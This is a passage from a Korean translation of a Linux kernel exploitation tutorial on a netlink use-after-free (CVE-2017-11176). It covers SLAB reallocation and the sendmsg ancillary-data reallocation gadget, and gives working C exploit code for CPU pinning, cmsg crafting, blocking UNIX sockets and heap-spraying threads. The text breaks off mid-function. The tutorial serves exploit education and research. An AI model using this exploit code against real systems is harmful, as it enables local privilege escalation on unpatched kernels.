*UAF primitives*가 정말 많다. 너무 많다😢... 문제는 모든 primitive에 대해서 다음을 해야 한다는 것이다:

* 유용한 것을 하거나 *no-op*를 한다
* (BUG\_ON()에 의한) 크래시가 나거나 나쁜 참조를 하면 안 된다

**이때문에 *netlink\_release()*는 익스플로잇을 위해 좋은 candidate가 아니다(다음 섹션을 보라).**

넘어가기 전에 PoC를 수정하여 이것이 크래시가 나는 근본적인 이유라는 것을 검증해보자:

```c
int main(void)
{
  // ... cut ...

  printf("[ ] ready to crash?\n");
  PRESS_KEY();

  close(unblock_fd);

  printf("[ ] are we still alive ?\n");
  PRESS_KEY();
}
```

"*[] are we still alive?*" 메시지가 보이지 않는다. 우리 생각이 맞았다. 커널은 *netlilnk\_release()*의 UAF에서 크래시가 난 것이다. 이는 다른 중요한 의미를 갖는다:

***use-after-free*를 언제든 우리가 원할 때 트리거할 방법이 있다는 것이다!***

dangling pointer들을 찾고, 커널 크래시가 왜 나는지 이해하여 우리가 원할 때 UAF를 트리거할 수 있음을 알게 되었다. 이제 익스플로잇 차례다!

- - -

## Exploit (Reallocation)

*"이건 드릴이 아니다!"*

*use-after-free*를 (type confusion으로) 익스플로잇할 땐 버그와 상관 없이 재할당이 필요한 부분이 있다. 그러려면 **재할당 가젯**이 필요하다.

재할당 가젯은 유저 영역(보통 syscall)에서 커널이 kmalloc()(= 커널 코드 경로)을 호출하도록 하는 수단이다. *이상적인* 재할당 가젯은 다음과 같은 속성을 지닌다:

* **빠르다**: *kmalloc()*에 도달할 때까지 복잡한 경로가 없다
* **데이터 컨트롤**: *kmalloc()*으로 할당된 데이터를 임의적인 내용으로 채운다
* **block이 없다**: 가젯이 스레드를 block하지 않는다
* **유연하다**: *kmalloc()*의 인자 크기를 조정할 수 있다

안타깝게도 이걸 다 하는 단일 가젯을 찾기는 어렵다. *잘 알려진* 가젯으로는 **msgsnd()** (System V IPC)가 있다. 빠르고, block하지도 않으며 크기 64로 시작하는 어떤 *general purpose kmem\_cache*도 hit할 수 있다. 아쉽게도 데이터의 앞 48 바이트(*sizeof(struct msg_msg)*)는 조정할 수 없다. 여기선 사용하지 않겠지만 이 가젯에 대해 궁금하다면 *sysv\_msg\_load()*를 보자.

이 섹션은 *잘 알려진* 가젯인 **ancillary data buffer**(*sendmsg()*라고도 불림)에 대해 소개한다. 그리고 익스플로잇이 실패하는 주된 문제와 위험을 최소화하는 방법을 보여줄 것이다. 유저 영역에서 재할당을 어떻게 구현하는지 보며 섹션을 마치게 된다.

- - -

### Reallocation Introduction (SLAB)

**type confusion**으로 *use-after-free*를 익스플로잇하려면 이전의 *struct netlink\_sock* **대신에** 제어되는 오브젝트를 할당해야 한다. 이 오브젝트가 0xffffffc0aabbcced에 있다고 생각해보자. **이 위치를 바꿀 수 없다!**

*"대상에게 다가갈 수 없다면, 오게끔 만들어라"*

**아주 구체적인 메모리 영역에 오브젝트를 할당하는 것을 재할당이라고 한다. 보통 메모리 위치는 방금 free된 오브젝트의 위치와 같다(예: 우리의 경우엔 *struct netlink\_sock*).

SLAB allocator를 사용하고 있다면 이는 꽤 간단하다. 왜일까? *struct array\_cache*를 통해 SLAB는 **후입선출 알고리즘**을 사용한다. 즉 마지막으로 주어진 크기(kmalloc-1024)의 free된 메모리 영역이 첫 번째로 같은 크기를 할당하는 데 쓰인 메모리 영역이 되는 것이다(Core Concepts #3 참고). 이는 **slab과 독립적이어서** 더 *끝내준다*. SLUB에서 재할당을 할 때 이런 속성이 그리울 것이다.

*kmalloc-1024* 캐시에 대해 설명하겠다:

* kmalloc-1024 kmem\_cache에 있는 각각의 오브젝트의 크기는 1024이다.
* 각 slab은 하나의 페이지(4096 바이트)로 이루어져 있기 때문에 한 slab에 네 오브젝트가 존재한다.
* 캐시가 두 slab을 가진다고 생각하자

*struct netlink\_sock* 오브젝트를 free하기 전의 상황은 다음과 같다:

![Reallocation before free](https://blog.lexfo.fr/images/cve-2017-11176-linux/realloc_0.png)

**ac->available**이 다음 free한 오브젝트의 인덱스임에 주목하자. 그리고 *netlink\_sock* 오브젝트는 free하다. *제일 빠른 경로*에서 오브젝트를 free하는 것(*kfree(objp)*)은 다음과 동일하다:

```c
ac->entry[ac->avail++] = objp;  // "ac->avail" is POST-incremented
```

이는 다음과 같은 상황으로 이어진다:

![Reallocation after free](https://blog.lexfo.fr/images/cve-2017-11176-linux/realloc_1.png)

마지막으로 *struct sock* 오브젝트는 다음(*제일 빠른 경로*)을 통해 할당된다(*kmalloc(1024)*):

```c
objp = ac->entry[--ac->avail];  // "ac->avail" is PRE-decremented
```

이는 다음으로 이어진다:

![Reallocation realloc](https://blog.lexfo.fr/images/cve-2017-11176-linux/realloc_2.png)

이거다! **새 *struct sock*의 메모리 영역이 (이전의) *struct netlink\_sock*의 메모리 영역과 똑같다**(예: 0xffffffc0aabbccdd). 우리가 *retake* 혹은 "재할당"을 한 것이다.괜찮지 않은가?

뭐, **이것은 이상적인 경우이다**. 나중에 보겠지만 실제론 여러 일들이 잘못될 수 있다.

- - -

### Reallocation Gadget

이전 파트에서 sending buffer와 receiver buffer라는 두 소켓 버퍼를 다뤘다. 사실 세 번째로 **option buffer**("ancillary data buffer"라고도 불림)가 있다. 이번 섹션에선 이 option buffer를 어떻게 임의적인 데이터로 채우고 재할당 가젯으로 활용하는지 볼 것이다.

이 가젯은 *sendmsg()* syscall의 "위쪽" (upper) 부분에서 접근할 수 있다. **\_\_sys\_sendmsg()** 함수는 (거의) 직접적으로 *SYSCALL\_DEFINE3(sendmsg)*에 의해 호출된다:

```c
      static int __sys_sendmsg(struct socket *sock, struct msghdr __user *msg,
             struct msghdr *msg_sys, unsigned flags,
             struct used_address *used_address)
      {
        struct compat_msghdr __user *msg_compat =
            (struct compat_msghdr __user *)msg;
        struct sockaddr_storage address;
        struct iovec iovstack[UIO_FASTIOV], *iov = iovstack;
[0]     unsigned char ctl[sizeof(struct cmsghdr) + 20]
            __attribute__ ((aligned(sizeof(__kernel_size_t))));
        /* 20 is size of ipv6_pktinfo */
        unsigned char *ctl_buf = ctl;
        int err, ctl_len, iov_size, total_len;

        // ... cut (copy msghdr/iovecs + sanity checks) ...

[1]     if (msg_sys->msg_controllen > INT_MAX)
          goto out_freeiov;
[2]     ctl_len = msg_sys->msg_controllen;
        if ((MSG_CMSG_COMPAT & flags) && ctl_len) {
          // ... cut ...
        } else if (ctl_len) {
          if (ctl_len > sizeof(ctl)) {
[3]         ctl_buf = sock_kmalloc(sock->sk, ctl_len, GFP_KERNEL);
            if (ctl_buf == NULL)
              goto out_freeiov;
          }
          err = -EFAULT;

[4]       if (copy_from_user(ctl_buf, (void __user *)msg_sys->msg_control,
                 ctl_len))
            goto out_freectl;
          msg_sys->msg_control = ctl_buf;
        }

        // ... cut ...

[5]     err = sock_sendmsg(sock, msg_sys, total_len);

        // ... cut ...

      out_freectl:
        if (ctl_buf != ctl)
[6]       sock_kfree_s(sock->sk, ctl_buf, ctl_len);
      out_freeiov:
        if (iov != iovstack)
          sock_kfree_s(sock->sk, iov, iov_size);
      out:
        return err;
      }
```

이는 다음 일들을 한다:

* [0] - 36 바이트(16 + 20)의 *ctl* buffer를 스택에 선언한다
* [1] - *유저가 제공한 msg\_controllen*이 *INT\_MAX*보다 작거나 같은지 검증한다
* [2] - *유저가 제공한 msg\_controllen*을 *ctl\_len*에 복사한다
* [3] - ***ctl\_len* 크기의 커널 버퍼 *ctl\_buf*를 *kmalloc()*으로 할당한다**
* [4] - ***ctl\_len* 바이트의 *유저가 제공한 데이터*를 *msg\_control*로부터 [3]에서 할당된 커널 버퍼 *ctl_buf*로 옮긴다.**
* [5] - 소켓의 콜백 *sock->ops->sendmsg()*를 호출하는 *sock\_sendmsg()*를 호출한다.
* [6] - 커널 버퍼 *ctl\_buf*를 free한다

*유저가 제공한* 게 참 많지 않은가? 이게 우리가 좋아하는 이유다! 골자는 다음과 *kmalloc()*을 사용하여 커널 버퍼를 할당할 수 있다는 것이다:

* **msg->msg\_controllen**: 임의의 크기(36보다 크고 *INT\_MAX*보다 작아야 함)
* **msg->msg\_control**: 임의의 내용

이제 **sock\_kmalloc()**이 뭘 하는지 보자:

```c
      void *sock_kmalloc(struct sock *sk, int size, gfp_t priority)
      {
[0]     if ((unsigned)size <= sysctl_optmem_max &&
            atomic_read(&sk->sk_omem_alloc) + size < sysctl_optmem_max) {
          void *mem;
          /* First do the add, to avoid the race if kmalloc
           * might sleep.
           */
[1]       atomic_add(size, &sk->sk_omem_alloc);
[2]       mem = kmalloc(size, priority);
          if (mem)
[3]         return mem;
          atomic_sub(size, &sk->sk_omem_alloc);
        }
        return NULL;
      }
```

처음에 *size* 인자가 **커널 파라미터 "optmem\_max"**에 대해 검사된다. procfs를 통해서도 optmem\_max를 얻을 수 있다:

```bash
$ cat /proc/sys/net/core/optmem_max
```

주어진 size가 optmem\_max보다 작다면 *현재의* option 메모리 버퍼 크기에 size를 더한 후 그게 "optmem\_max"보다 작은지 검사한다 [0]. 우린 이것을 익스플로잇에서 확인해야 한다. 우리의 타겟 *kmem\_cache*이 **kmalloc-1024**임을 기억하자. "optmem\_max"의 크기가 512보다 작거나 같으면 망하는 것이다! 그럴 경우 다른 재할당 가젯을 찾아야 한다. **sk\_omen\_alloc**은 sock 생성 도중 0으로 초기화된다.

**노트**: *kmalloc(512 + 1)*은 *kmalloc-1024*에 들어간다

[0]의 검사를 통과하면 *sk\_omem\_alloc*의 값이 *size*만큼 올라간다 [1]. 그리고 *size*를 인자로 받는 **kmalloc()**을 호출하는 부분이 있다. 호출에 성공하면 포인터가 반환되고 [3], 실패하면 *sk\_omem\_alloc*이 *size*만큼 줄고 *NULL*을 반환한다.

좋다, 이제 거의 임의의 크기([36, sysctl\_optmem\_max])로, 임의의 값으로 채워 *kmalloc()*을 호출할 수 있게 되었다. 근데 문제가 있다. *\_\_sys\_sendmsg()*가 종료될 때(이전 내용의 [6]) *ctl\_buf* 버퍼가 자동적으로 free된다. 즉 ***sock\_sendmsg()*에 대한 호출은 [5] 무조건 block되어야 한다**(*sock->ops->sendmsg()*).

### Blocking sendmsg()

이전 파트에서 *sendmsg()*가 block을 호출하게 하려면 **receive buffer를 채워야** 한다는 것을 알았다. *netllink\_sendmsg()*에도 같은 방식을 쓰고 싶은 맘이 들 수 있지만, 그건 불가능하다. 이유는 *netlink\_sendmsg()*가 **netlink\_getsockbypid()**를 호출하는 *netlink\_unicast()*를 호출하기 때문이다. 그렇게 함으로써 **nl\_table의 해시 리스트 *dangling pointer*가 역참조**된다(= *use-after-free*).

즉 **AF\_UNIX**라는 다른 socket family를 사용해야 한다. 다른 걸 써도 되겠지만 AF\_UNIX는 거의 어디에나 있고 특정 권한을 요구하지 않는다.

**주의**: AF\_UNIX에 구현(특히 *unix\_dgram\_sendmsg()*)에 대해선 설명하지 않을 것이다. 내용이 너무 길고, 복잡하지도 않다(AF\_NETLINK랑 비슷한 면이 많음). 우린 두 가지만을 원한다:

* "option" 버퍼에 임의의 데이터를 할당한다(마지막 섹션(?) 참고)
* *unix\_dgram\_sendmsg* blocking을 호출한다

*netlink\_unicast()*처럼 *sendmsg()*도 다음 경우에 block될 수 있다:

1. 목적지 receive buffer가 가득 찬 경우
2. 송신자 소켓의 timeout 값이 *MAX\_SCHEDULE\_TIMEOUT*으로 설정된 경우

*unix\_dgram\_sendmsg()*의 *timeo* 값은 (*netlink\_unicast()*처럼) 다음을 통해 계산된다:

```c
timeo = sock_sndtimeo(sk, msg->msg_flags & MSG_DONTWAIT);
```

```c
static inline long sock_sndtimeo(const struct sock *sk, int noblock)
{
    return noblock ? 0 : sk->sk_sndtimeo;
}
```

즉 *noblock* 인자를 설정하지 않았을 때(= MSG\_DONTWAIT을 사용 안 함) timeout 값은 **sk\_sndtimeo**이다. 다행히도 그 값은 **setsockopt()**를 *통해서* 조정할 수 있다:

```c
int sock_setsockopt(struct socket *sock, int level, int optname,
            char __user *optval, unsigned int optlen)
{
    struct sock *sk = sock->sk;

  // ... cut ...

    case SO_SNDTIMEO:
        ret = sock_set_timeout(&sk->sk_sndtimeo, optval, optlen);
        break;

  // ... cut ...
}
```

여기서 **sock\_set\_timeout()**을 호출한다:

```c
static int sock_set_timeout(long *timeo_p, char __user *optval, int optlen)
{
    struct timeval tv;

    if (optlen < sizeof(tv))
        return -EINVAL;
    if (copy_from_user(&tv, optval, sizeof(tv)))
        return -EFAULT;
    if (tv.tv_usec < 0 || tv.tv_usec >= USEC_PER_SEC)
        return -EDOM;

    if (tv.tv_sec < 0) {
    // ... cut ...
    }

    *timeo_p = MAX_SCHEDULE_TIMEOUT;          // <-----
    if (tv.tv_sec == 0 && tv.tv_usec == 0)    // <-----
        return 0;                             // <-----

  // ... cut ...
}
```

마지막에 *SO\_SNDTIMEO* 옵션을 줘서 *setsockopt*를 실행하고, 0으로 가득 찬 *struct timeval* 필드를 건네주면 timeout이 *MAX\_SCHEDULE\_TIMEOUT*으로 설정될 것이다(= 무조건 block). 여기에 어떤 특정한 권한도 필요하지 않다.

문제 하나 해결이다!

두 번째 문제는 **control buffer 데이터를 사용하는 코드를 다뤄야** 한다는 것이다. 이는 *unix\_dgram\_sendmsg()* 초반부에 호출된다:

```c
static int unix_dgram_sendmsg(struct kiocb *kiocb, struct socket *sock,
                  struct msghdr *msg, size_t len)
{
    struct sock_iocb *siocb = kiocb_to_siocb(kiocb);
    struct sock *sk = sock->sk;

  // ... cut (lots of declaration) ...

    if (NULL == siocb->scm)
        siocb->scm = &tmp_scm;
    wait_for_unix_gc();
    err = scm_send(sock, msg, siocb->scm, false);     // <----- here
    if (err < 0)
        return err;

  // ... cut ...
}
```

우린 이미 이전 파트에서 이 검사를 통과했지만 살짝 다른 부분이 있다:

```c
static __inline__ int scm_send(struct socket *sock, struct msghdr *msg,
                   struct scm_cookie *scm, bool forcecreds)
{
    memset(scm, 0, sizeof(*scm));
    if (forcecreds)
        scm_set_cred(scm, task_tgid(current), current_cred());
    unix_get_peersec_dgram(sock, scm);
    if (msg->msg_controllen <= 0)         // <----- this is NOT true anymore
        return 0;
    return __scm_send(sock, msg, scm);
}
```

볼 수 있듯이 우린 이제 **msg\_control**을 사용하고 있다(따라서 *msg\_controllen*은 양수). 즉 **이제 *\_\_scm\_send()*를 우회할 수 없으니 0을 반환하도록 만들어야 한다**.

"ancillary data object information" 구조체를 보며 시작해보자:

```c
struct cmsghdr {
  __kernel_size_t cmsg_len;   /* data byte count, including hdr */
  int             cmsg_level;   /* originating protocol */
  int             cmsg_type;    /* protocol-specific type */
};
```

이것은 **16 바이트**의 구조체로 (임의의 데이터가 들어있는) "msg\_control" 버퍼의 극 초반부에 위치해야 한다. 용도는 소켓 타입에 따라 달라지는데 소켓과 "뭔가 특별한 일"을 하는 것처럼 보이기도 한다. 예를 들어 UNIX 소켓에선 소켓을 통해 "credentials"를 전달하는 데 사용될 수 있다.

**control message buffer (*msg\_control*)은 하나 혹은 여러 control message를 가질 수 있다. 각각의 control message는 데이터의 헤더로 이루어져 있다.**

control message의 첫 헤더는 **CMSG\_FIRSTHDR()** 매크로로 얻을 수 있다:

```c
#define CMSG_FIRSTHDR(msg)  __CMSG_FIRSTHDR((msg)->msg_control, (msg)->msg_controllen)

#define __CMSG_FIRSTHDR(ctl,len) ((len) >= sizeof(struct cmsghdr) ? \
                  (struct cmsghdr *)(ctl) : \
                  (struct cmsghdr *)NULL)
```

즉 주어진 *msg\_controllen*의 len이 16 바이트보다 큰지 검사한다. 만약 크지 않다면 control message buffer가 control message header조차 가지고 있지 않다는 뜻이다! 이 경우 NULL이 반환된다. 그렇지 않으면 첫 control message(= *msg\_control*)의 시작 주소를 반환한다.

다음 control mesage를 찾으려면 다음 control message header의 시작 주소를 가져오는 **CMG\_NXTHDR()**를 사용해야 한다:

```c
#define CMSG_NXTHDR(mhdr, cmsg) cmsg_nxthdr((mhdr), (cmsg))

static inline struct cmsghdr * cmsg_nxthdr (struct msghdr *__msg, struct cmsghdr *__cmsg)
{
    return __cmsg_nxthdr(__msg->msg_control, __msg->msg_controllen, __cmsg);
}

static inline struct cmsghdr * __cmsg_nxthdr(void *__ctl, __kernel_size_t __size,
                           struct cmsghdr *__cmsg)
{
    struct cmsghdr * __ptr;

    __ptr = (struct cmsghdr*)(((unsigned char *) __cmsg) +  CMSG_ALIGN(__cmsg->cmsg_len));
    if ((unsigned long)((char*)(__ptr+1) - (char *) __ctl) > __size)
        return (struct cmsghdr *)0;

    return __ptr;
}
```

**보기보다 복잡하지 않다!** 그냥 현재 control message header의 주소 *cmsg*에 현재 control message header에 명시된 **cmsg\_len**을 더한다(필요하다면 몇 몇 alignment를 좀 더한다). 만약 "다음 헤더"가 전체 *control message buffer* 의 *총 크기*를 벗어난다면 더이상 헤더가 없다는 뜻이므로 NULL을 반환한다. 그렇지 않으면 계산된 포인터(= 다음 헤더)가 반환된다.

**조심하자! *cmsg\_len*은 control message 그리고 그 header의 길이이다!**

마지막으로 *현재* control message의 크기(= *cmsg\_len*)가 전체 control message buffer보다 크지 않은지를 검사하는 *sanity check* 매크로 **CMSG\_OK()**가 있다:

```c
#define CMSG_OK(mhdr, cmsg) ((cmsg)->cmsg_len >= sizeof(struct cmsghdr) && \
                 (cmsg)->cmsg_len <= (unsigned long) \
                 ((mhdr)->msg_controllen - \
                  ((char *)(cmsg) - (char *)(mhdr)->msg_control)))
```

그럼 이제 control message로 (결국(eventually)) 유용한 일을 해주는 **\_\_scm\_send()** 코드를 보자:

```c
      int __scm_send(struct socket *sock, struct msghdr *msg, struct scm_cookie *p)
      {
        struct cmsghdr *cmsg;
        int err;

[0]     for (cmsg = CMSG_FIRSTHDR(msg); cmsg; cmsg = CMSG_NXTHDR(msg, cmsg))
        {
          err = -EINVAL;

[1]       if (!CMSG_OK(msg, cmsg))
            goto error;

[2]       if (cmsg->cmsg_level != SOL_SOCKET)
            continue;

          // ... cut (skipped code) ...
        }

        // ... cut ...

[3]     return 0;

      error:
        scm_destroy(p);
        return err;
      }
```

우리의 목적은 *\_\_scm\_send()*가 0을 반환하게 하는 것이다 [3]. **msg\_controllen**의 크기가 우리 재할당의 크기(= 1024)와 같기 때문에 루프에 들어갈 것이다 [0] (= *CMSG\_FIRSTHDR(msg) != NULL*).

[1] 때문에 *첫 control message header*의 값은 유효할 것이다. 1024(전체 control message buffer의 크기)로 설정하자. 그리고 SOL\_SOCKET(= 1)과 다른 값을 명시하여 루프 전체를 뛰어넘을 수 있다 [2]. 즉 **cmsg\_len이 msg\_controllen과 같기 때문에** *CMSG\_NXTHDR()*가 다음 control message header를 찾을 것이고, cmsg가 NULL이 되어  루프를 빠져나가 0을 반환할 수 있을 것이다 [3]!

다시 말해 이 재할당으로는:

* reallocation buffer(size=1024)의 **첫 8 바이트를 조정할 수 없다**
* cmsg control header의 **두 번째 필드에 제약이** 있다(값이 1이 아님)
* 헤더의 마지막 4 바이트는 나머지 **1008 바이트**와 마찬가지로 **자유롭게 사용할 수 있다**

![Reallocation gadget](https://blog.lexfo.fr/images/cve-2017-11176-linux/realloc_gadget.png)

(거의) 임의적인 데이터로 kmalloc-1024에 재할당하는 데 필요한 모든 것을 갖췄다. 구현에 더 깊게 파고들기 전에 잘못될 수 있는 포인트에 대해 조금 공부하고 넘어가자.

### What Could Possibly Go Wrong?

[Reallocation Introduction]에서 *이상적인* 시나리오(= 가장 빠른 경로)에 대해 다뤘다. 그러나 그 경로로 가지 못한다면 무슨 일이 벌어질까? 문제가 생길 수 있다.

**주의**: *kmalloc()/kfree()*의 모든 경로를 다루지 않는다. 지금은 allocator에 대해 이해하고 있기를 바란다.

예를 들어 *netlink\_sock* 오브젝트가 free되려는 상황을 생각해보자:

1. *array\_cache*가 꽉 차면 **cache\_flusharray()**가 호출된다. 이 함수는 *노드마다 있는 공유된* array\_cache에 *batchcount* 포인터를 놓고 **free\_block()**을 호출한다. 즉 **다음 kmalloc()의 제일 빠른 경로는 마지막으로 free된 오브젝트를 재사용하지 않는다**. 이것이 후입선출이라는 속성을 깬다(break).
2. *partial slab*에서 마지막으로 "사용된" 오브젝트를 free하면 slabs\_free list로 옮겨진다.
3. 캐시가 이미 "너무 많은" free object를 가지고 있다면 *free slab*이 소멸(destroy)된다(= 페이지가 buddy로 돌아간다).
4. 버디 자체는 "compaction"에 관련된 것을 착수하고 sleep*할 수도 있다*.
5. 스케쥴러는 우리의 task를 다른 CPU로 옮기기로 결정하며 *array\_cache*는 CPU마다 있다(?).
6. 시스템은 메모리 부족을 겪으며(우리 때문이 아님) 모든 하위 시스템/allocator 등으로부터 메모리를 되찾으려 한다.

고려해볼 다른 경로들이 있으며 이건 *kmalloc()*도 마찬가지다. 이 모든 주제(issue)는 우리의 task가 시스템에 *홀로* 있다고 가정한다. 내용이 더 남아있다!

***kamlloc-1024*을 동시에(concurrently) 쓰고 있는 다른 task들(커널 것도 포함)이 있다. 우린 그 task들과 "race"에 처해있다. 질 *수 있는* race이다...**

예를 들어 *netlink\_sock* 오브젝트를 방금 free했는데 다른 taksk도 *kmalloc-1024* 오브젝트를 free했을 수 있다. 이 경우 *netlink\_sock*을 재할당하려면 **두 번 할당해야** 한다(LIFO). 만약 다른 task가 "가져갔다면"(= *raced*)? 그럼 그 task가 (다른 cpu로 가지 않았기를 바라며) 돌려줄 때까지 재할당을 할 수 없다. 하지만 돌려주는지를 어떻게 감지할까?🤷‍♀️

방금 본 것처럼 많은 문제가 생길 수 있다. *netlink\_sock* 오브젝트를 free하고 나서 그걸 재할당하기 전까지가 익스플로잇에서 제일 중요한 경로이다. 모든 문제를 이 문서에서 다룰 순 없다. 이는 더 높은 수준의 익스플로잇에서 쓰이며 커널에 대한 강력한 지식을 필요로 한다. 확실한 재할당은 복잡한 주제다.

그러나 앞서 말한 문제를 해결할 두 가지 기본적인 테크닉을 소개하겠다:

1. **sched\_setaffinity()**를 통해 CPU를 fix한다. *array\_cache*는 CPU마다 있는 구조체다. 만약 CPU를 하나만 쓰도록 설정해두었다면 free하고 재할당할 때 같은 *array\_cache*를 사용하는 것이 보장된다.
2. **Heap Spraying**. 재할당을 "많이" 함으로써 다른 task가 *kmalloc-1024* 오브젝트를 free했더라도 *netlink\_sock* 오브젝트를 재할당할 수 있다. 만약 *netlink\_sock*의 slab이 free slab 리스트의 끝에 있다면 *cache\_grow()*가 끝내 발생할 때까지 리스트 전체에 allocate를 시도한다. 그러나 이것은 순전히 추측(guessing)일 뿐이다. 기본적인 테크닉임을 기억하자.

이게 어떻게 이뤄지는지는 구현 섹션을 참고하라.

### A New Hope

마지막 섹션에서 걱정이 들었는가? 이번엔 운이 좋으니 걱정하지 말자. 우리가 익스플로잇하려는 오브젝트(*struct netlink\_sock*)가 **kmalloc-1024**에 있다. *끝내주는* 점은 이 캐시가 커널에서 많이 안 쓰인다는 점이다. 확신을 얻기 위해 "Method #5"(Detecting the object size 참고)에서 나온 *poor man method*를 사용하여 여러 general kmemcache를 관찰해보자:

```bash
watch -n 0.1 'sudo cat /proc/slabinfo | egrep "kmalloc-|size-" | grep -vi dma'
```

보이는가? 그리 많이(아예?) 움직이지 않는다. 그러곤 "kmalloc-256", "kmalloc-192", "kmalloc-64", "kmalloc-32"를 보라. 얘넨 악당이다. 가장 평범한 커널 오브젝트 크기이다. 이런 캐시에서 UAF를 익스플로잇하는 것은 지옥에 발을 들이는 것일 수 있다. 물론 "kmalloc activity"는 타겟에 따라 다르고 어떤 프로세스가 실행 중이냐에 따라 다르다. 하지만 대부분의 시스템에서 이 캐시들은 *불안정하다*.

### Reallocation Implementation

그럼 이제 PoC로 돌아와서 재할당 부분을 코딩할 시간이다.

모든 스레드를 CPU#0으로 옮겨 **array\_cache**를 fix해보자.

```c
static int migrate_to_cpu0(void)
{
  cpu_set_t set;

  CPU_ZERO(&set);
  CPU_SET(0, &set);

  if (_sched_setaffinity(_getpid(), sizeof(set), &set) == -1)
  {
    perror("[-] sched_setaffinity");
    return -1;
  }

  return 0;
}
```

다음으로 "ancillary data buffer" primitive를 사용할 수 있는지 체크하고 싶다. (*procfs*를 이용하여) *optmem\_max*를 조사해보자:

```c
static bool can_use_realloc_gadget(void)
{
  int fd;
  int ret;
  bool usable = false;
  char buf[32];

  if ((fd = _open("/proc/sys/net/core/optmem_max", O_RDONLY)) < 0)
  {
    perror("[-] open");
    // TODO: fallback to sysctl syscall
    return false; // we can't conclude, try it anyway or not ?
  }

  memset(buf, 0, sizeof(buf));
  if ((ret = _read(fd, buf, sizeof(buf))) <= 0)
  {
    perror("[-] read");
    goto out;
  }
  printf("[ ] optmem_max = %s", buf);

  if (atol(buf) > 512) // only test if we can use the kmalloc-1024 cache
    usable = true;

out:
  _close(fd);
  return usable;
}
```

다음 단계는 control message buffer를 준비하는 것이다. **g\_realloc\_data**는 전역으로 선언되어 모든 스레드에서 접근할 수 있다. 적절한 *cmsg* 필드가 설정된다:

```c
#define KMALLOC_TARGET 1024

static volatile char g_realloc_data[KMALLOC_TARGET];

static int init_realloc_data(void)
{
  struct cmsghdr *first;

  memset((void*)g_realloc_data, 0, sizeof(g_realloc_data));

  // necessary to pass checks in __scm_send()
  first = (struct cmsghdr*) g_realloc_data;
  first->cmsg_len = sizeof(g_realloc_data);
  first->cmsg_level = 0; // must be different than SOL_SOCKET=1 to "skip" cmsg
  first->cmsg_type = 1; // <---- ARBITRARY VALUE

  // TODO: do something useful will the remaining bytes (i.e. arbitrary call)

  return 0;
}
```

AF\_UNIX 소켓을 재할당할 것이므로 그에 대한 준비를 해야 한다. *모든 재할당 스레드*에 대해 소켓을 한 짝씩 만들 것이다. 여기서 *특별한 종류*의 유닉스 소켓인 **abstract socket** (man 7 unix)를 사용한다. 즉 이들의 주소는 NULL 바이트로 시작한다(*netstat*에선 '@'). 필수적인 작업은 아니지만 해두면 좋다. 송신자 소켓이 수신자 소켓에 연결하고 마침내 *setsockopt()*를 통해 *timeout* 값을 *MAX\_SCHEDULE\_TIMEOUT*으로 설정한다:

```c
struct realloc_thread_arg
{
  pthread_t tid;
  int recv_fd;
  int send_fd;
  struct sockaddr_un addr;
};

static int init_unix_sockets(struct realloc_thread_arg * rta)
{
  struct timeval tv;
  static int sock_counter = 0;

  if (((rta->recv_fd = _socket(AF_UNIX, SOCK_DGRAM, 0)) < 0) ||
      ((rta->send_fd = _socket(AF_UNIX, SOCK_DGRAM, 0)) < 0))
  {
    perror("[-] socket");
    goto fail;
  }

  // bind an "abstract" socket (first byte is NULL)
  memset(&rta->addr, 0, sizeof(rta->addr));
  rta->addr.sun_family = AF_UNIX;
  sprintf(rta->addr.sun_path + 1, "sock_%lx_%d", _gettid(), ++sock_counter);
  if (_bind(rta->recv_fd, (struct sockaddr*)&rta->addr, sizeof(rta->addr)))
  {
    perror("[-] bind");
    goto fail;
  }

  if (_connect(rta->send_fd, (struct sockaddr*)&rta->addr, sizeof(rta->addr)))
  {
    perror("[-] connect");
    goto fail;
  }

  // set the timeout value to MAX_SCHEDULE_TIMEOUT
  memset(&tv, 0, sizeof(tv));
  if (_setsockopt(rta->recv_fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv)))
  {
    perror("[-] setsockopt");
    goto fail;
  }

  return 0;

fail:
  // TODO: release everything
  printf("[-] failed to initialize UNIX sockets!\n");
  return -1;
}
```

재할당 스레드는 **init\_reallocation()**에서 초기화된다:

```c
static int init_reallocation(struct realloc_thread_arg *rta, size_t nb_reallocs)
{
  int thread = 0;
  int ret = -1;

  if (!can_use_realloc_gadget())
  {
    printf("[-] can't use the 'ancillary data buffer' reallocation gadget!\n");
    goto fail;
  }
  printf("[+] can use the 'ancillary data buffer' reallocation gadget!\n");

  if (init_realloc_data())
  {
    printf("[-] failed to initialize reallocation data!\n");
    goto fail;
  }
  printf("[+] reallocation data initialized!\n");

  printf("[ ] initializing reallocation threads, please wait...\n");
  for (thread = 0; thread < nb_reallocs; ++thread)
  {
    if (init_unix_sockets(&rta[thread]))
    {
      printf("[-] failed to init UNIX sockets!\n");
      goto fail;
    }

    if ((ret = pthread_create(&rta[thread].tid, NULL, realloc_thread, &rta[thread])) != 0)
    {
      perror("[-] pthread_create");
      goto fail;
    }
  }

  // wait until all threads have been created
  while (g_nb_realloc_thread_ready < nb_reallocs)
    _sched_yield(); // don't run me, run the reallocator threads!

  printf("[+] %lu reallocation threads ready!\n", nb_reallocs);

  return 0;

fail:
  printf("[-] failed to initialize reallocation\n");
  return -1;
}
```

재할당 스레드가 시작되면 *MSG\_DONTWAIT*(= non-blocked)으로 수신자의 receive buffer를 flood하여 송신자 소켓을 "big GO"(= reallocation)때까지 block한다:

```c
static volatile size_t g_nb_realloc_thread_ready = 0;
static volatile size_t g_realloc_now = 0;

static void* realloc_thread(void *arg)
{
  struct realloc_thread_arg *rta = (struct realloc_thread_arg*) arg;
  struct msghdr mhdr;
  char buf[200];

  // initialize msghdr
  struct iovec iov = {
    .iov_base = buf,
    .iov_len = sizeof(buf),
  };
  memset(&mhdr, 0, sizeof(mhdr));
  mhdr.msg_iov = &iov;
  mhdr.msg_iovlen = 1;

  // the thread should inherit main thread cpumask, better be sure and redo-it!
  if (migrate_to_cpu0())
    goto fail;

  // make it block
  while (_sendmsg(rta->send_fd, &mhdr, MSG_DONTWAIT) > 0)
    ;
  if (errno != EAGAIN)
  { 
    perror("[-] sendmsg");
    goto fail;
  }

  // use the arbitrary data now
  iov.iov_len = 16; // don't need to allocate lots of memory in the receive queue
  mhdr.msg_control = (void*)g_realloc_data; // use the ancillary data buffer
  mhdr.msg_controllen = sizeof(g_realloc_data);

  g_nb_realloc_thread_ready++;

  while (!g_realloc_now) // spinlock until the big GO!
    ;

  // the next call should block while "reallocating"
  if (_sendmsg(rta->send_fd, &mhdr, 0) < 0)
  {
